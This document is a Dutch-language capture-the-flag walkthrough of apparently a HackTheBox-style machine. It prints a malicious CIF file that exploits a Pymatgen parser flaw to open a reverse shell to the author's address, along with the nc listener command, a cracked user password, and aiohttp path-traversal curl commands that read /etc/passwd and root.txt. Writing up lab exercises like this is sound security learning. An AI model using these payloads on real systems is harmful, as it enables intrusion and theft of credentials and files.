
Als eerst zal ik gaan kijken welke poorten er openstaan. Dit zal ik gaan doen aan de hand van het volgende commando.

```
nmap -p- -sCV 10.129.175.140 -vvvv
```

Bij het scannen zullen we zien dat er 2 tcp poorten openstaan.

![image-20241104-132340.png](53215244.png)

```
poort 22 staat voor ssh

poort 5000 staat voor upnp? (Universal Plug and Play)
```

Als we op de webbrowser zullen gaan zoeken naar het ip adres zullen we deze niet vinden omdat er geen op poort 80 of 443 openstaat. Maar als we hiervoor de poort nummer 5000 zullen gaan gebruiken zullen we zien dat een we een webpagina te voorschijn komt.

![image-20241104-132746.png](53411844.png)

Ik ben eerst gaan proberen inloggen met het admin account maar ik kon er niet op geraken doordat het niet de juiste credentials waren. Wat ik dan ben gaan doen is mij gaan registreren met de user “test“ en het password “test“.

![image-20241104-133457.png](53346316.png)

Zoals je nu kunt zien kunnen we een CIF bestand gaan uploaden. We kunnen hiervoor eerst een voorbeeld bestand downloaden. Dit is wat ik van het gedownloade bestand te zien kreeg.

![image-20241104-133914.png](53084169.png)

Hieruit kan je niet veel data opmaken. Dus ben ik eens gaan zoeken naar een CVE voor CIF bestanden.

![image-20241104-134423.png](53510145.png)

In deze pagina staat er CVE die ik kan gaan gebruiken voor het uploaden van een CIF file waarmee ik connectie zal krijgen met de server.

```
data_5yOhtAoR  
_audit_creation_date            2018-06-08  
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"  
  
loop_  
_parent_propagation_vector.id  
_parent_propagation_vector.kxkykz  
k1 [0 0 0]  
  
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \ 'sh -i >& /dev/tcp/10.10.14.76/5555 0>&1\'");0,0,0'  
  
  
_space_group_magn.number_BNS  62.448  
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

**ip address 10.10.14.76 (ip dat ik gebruik op mijn eigen machine)**

**poort 5555 (poort dat ik gebruik waarop het moet luisteren)**

Aan de hand van deze code, zullen we een .cif file moeten maken en deze moeten gaan uploaden op de server. Eens deze file is upgeload zullen we op view gaan drukken en zullen we op een apparte terminal een connectie gaan maken met de server.

dit zal ik doen aan de hand van het volgende commando.

```
nc -nlvp 5555
```
zoals je nu kunt zien hebben we een shell met de server.

![image-20241104-143211.png](53673989.png)

We zullen het volgende commando gaan gebruiken voor een betere en mooiere shell te hebben.

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![image-20241104-143322.png](53673995.png)

als we naar de instances zullen gaan, zien we daar een database. Als we deze database zullen gaan bekijken met het commando “cat” Dan krijgen we het volgende te zien.

![image-20241104-144231.png](53542927.png)

wse zien allemaal hashes. Als we nu via [https://crackstation.net/](https://crackstation.net/) zullen gaan zoeken naar wachtwoorden, zullen we het wachtwoord van de user rosa te zien krijgen. Dit password is “

|                   |
| ----------------- |
| unicorniosrosados |

“

als we nu gaan veranderen van user door het commando te gebruiken:

```
su user
```

zullen we het wachtwoord moeten gaan ingeven. Eens dit wachtweoord is ingegeven kunnen we naar de home folder gaan en zullen we een user.txt zien. Dit is de eerste flag.

![image-20241104-144713.png](53739529.png)

Als ik nu als user rosa het volgende commando zal gaan uitvoeren:

```
netstat -l
```

Hiermee kunnen we gaan zien wat er allemaal draait. We zullen zien dat er nog een andere webpagina is. Deze is localhost:http-alt (Wat dus wilt zeggen op poort 8080).

ik ben eens gaan kijken op welke server deze draaide. Hieronder zal je zien dat deze op aiohttp draait.

![[Pasted image 20250122150254.png]]

Dus ik ben gaan zoeken naar een cve voor deze server.

![image-20241104-150015.png](53510162.png)

Hier zien we dat we met dit kunnen gaan kijken of dat we de /etc/shadow file kunnen open krijgen aan de hand van het volgende commando:

```
curl -s --path-as-is http://localhost:8080/assets/../../../../etc/passwd
```

Zoals je kan zien kunnen we de file bekijken.

![image-20241104-150301.png](53641229.png)

dus als we nu in plaats van de etc/shadow file zullen gaan bekijken, kunnen we dit nu gaan doen voor de root.txt onze second flag.

Zoals je hieronder zult kunnen zien hebben we de 2de flag gevonden aan de hand van het volgende commando.

```
curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
```

![image-20241104-150438.png](53641235.png)

